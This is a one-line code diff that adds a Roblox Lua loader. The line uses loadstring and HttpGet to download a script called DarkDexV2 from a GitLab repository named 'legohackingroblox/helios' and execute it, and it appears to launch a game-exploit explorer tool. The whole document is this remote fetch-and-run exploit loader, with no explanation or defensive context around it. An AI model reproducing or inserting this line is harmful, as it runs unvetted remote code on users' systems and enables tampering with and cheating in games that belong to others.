@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://gitlab.com/legohackingroblox/helios/-/raw/main/DarkDexV2'))()
